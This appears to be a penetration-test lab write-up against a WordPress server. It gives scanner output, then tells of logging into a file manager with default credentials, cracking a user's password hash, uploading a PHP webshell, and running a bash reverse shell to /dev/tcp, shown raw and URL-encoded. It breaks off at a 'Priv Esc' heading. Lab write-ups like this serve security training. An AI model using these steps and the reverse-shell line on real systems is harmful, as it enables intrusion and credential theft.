## NMAP 

```bash

```

## CURL 

```bash
HTTP/1.1 302 Found
Date: Fri, 12 Jul 2024 18:02:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://TARGET/wp-admin/setup-config.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8

```

## Gobuster

Self Enumerate these!

Directories -> 

```bash
/wp-admin             (Status: 301) [Size: 319] [--> http://TARGET/wp-admin/]
/wp-includes          (Status: 301) [Size: 322] [--> http://TARGET/wp-includes/]
/wp-content           (Status: 301) [Size: 321] [--> http://TARGET/wp-content/]
/wordpress            (Status: 301) [Size: 320] [--> http://TARGET/wordpress/]
/filemanager          (Status: 301) [Size: 322] [--> http://TARGET/filemanager/]

```

Files ->

```bash
/index.php            (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/xmlrpc.php           (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-login.php         (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/readme.html          (Status: 200) [Size: 7402]
/.htaccess            (Status: 403) [Size: 279]
/license.txt          (Status: 200) [Size: 19915]
/wp-trackback.php     (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-settings.php      (Status: 500) [Size: 0]
/.                    (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-mail.php          (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-cron.php          (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-blog-header.php   (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-links-opml.php    (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/wp-load.php          (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/wp-activate.php      (Status: 302) [Size: 0] [--> http://TARGET/wp-admin/setup-config.php]
/.htpasswd            (Status: 403) [Size: 279]
/.htm                 (Status: 403) [Size: 279]
/.htpasswds           (Status: 403) [Size: 279]
/.htgroup             (Status: 403) [Size: 279]
/wp-forum.phps        (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htuser              (Status: 403) [Size: 279]
/.ht                  (Status: 403) [Size: 279]
/.htc                 (Status: 403) [Size: 279]

```
## Nikto

```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          TARGET
+ Target Hostname:    TARGET
+ Target Port:        80
+ Start Time:         2024-07-12 14:02:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://TARGET/wp-admin/setup-config.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.

```

## Whatweb

```bash
WhatWeb report for http://TARGET:80
Status    : 302 Found
Title     : <None>
IP        : TARGET
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], RedirectLocation[http://TARGET/wp-admin/setup-config.php]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.41 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Ubuntu Linux
	String       : Apache/2.4.41 (Ubuntu) (from server string)

[ RedirectLocation ]
	HTTP Server string location. used with http-status 301 and
	302

	String       : http://TARGET/wp-admin/setup-config.php (from location)

HTTP Headers:
	HTTP/1.1 302 Found
	Date: Fri, 12 Jul 2024 18:02:39 GMT
	Server: Apache/2.4.41 (Ubuntu)
	Location: http://TARGET/wp-admin/setup-config.php
	Content-Length: 0
	Connection: close
	Content-Type: text/html; charset=UTF-8

WhatWeb report for http://TARGET/wp-admin/setup-config.php
Status    : 200 OK
Title     : WordPress &rsaquo; Setup Configuration File
IP        : TARGET
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], JQuery[3.6.3], Script[text/javascript]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.41 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Ubuntu Linux
	String       : Apache/2.4.41 (Ubuntu) (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse
	HTML documents, handle events, perform animations, and add
	AJAX.

	Version      : 3.6.3
	Website     : http://jquery.com/

[ Script ]
	This plugin detects instances of script HTML elements and
	returns the script language/type.

	String       : text/javascript

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Fri, 12 Jul 2024 18:02:43 GMT
	Server: Apache/2.4.41 (Ubuntu)
	Expires: Wed, 11 Jan 1984 05:00:00 GMT
	Cache-Control: no-cache, must-revalidate, max-age=0
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 1048
	Connection: close
	Content-Type: text/html; charset=utf-8

```
## Screenshot 

![Pasted image 20240712141134.png](Evidence/Pasted%20image%2020240712141134.png)

![Pasted image 20240712141739.png](Evidence/Pasted%20image%2020240712141739.png)

Found a login page from this endpoint -> http://TARGET/filemanager/

![Pasted image 20240712141922.png](Evidence/Pasted%20image%2020240712141922.png)

credentials are default `admin : admin`

![Pasted image 20240712142048.png](Evidence/Pasted%20image%2020240712142048.png)

![Pasted image 20240712145258.png](Evidence/Pasted%20image%2020240712145258.png)

after looking around in the config folder of file manager the htusers file contains doras hashed password 

![Pasted image 20240712145514.png](Evidence/Pasted%20image%2020240712145514.png)

we took doras password and cracked it

we have upload functionality, lets try to upload a php webshell 

![Pasted image 20240712142253.png](Evidence/Pasted%20image%2020240712142253.png)

successfully uploaded php webshell into the root directory

![Pasted image 20240712142356.png](Evidence/Pasted%20image%2020240712142356.png)

it worked I now have RCE on the target machine 

time for a reverse shell 

this is our rev sehll payload -> 
```
bash -c 'bash -i >& /dev/tcp/ATTACKER/80 0>&1'
```

we need to URL encode it ->
```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.159%2F80%200%3E%261%27
```

then paste it into the cmd parameter ->

![Pasted image 20240712142923.png](Evidence/Pasted%20image%2020240712142923.png)

run a listener ->

![Pasted image 20240712142533.png](Evidence/Pasted%20image%2020240712142533.png)

![Pasted image 20240712142947.png](Evidence/Pasted%20image%2020240712142947.png)

Priv Esc
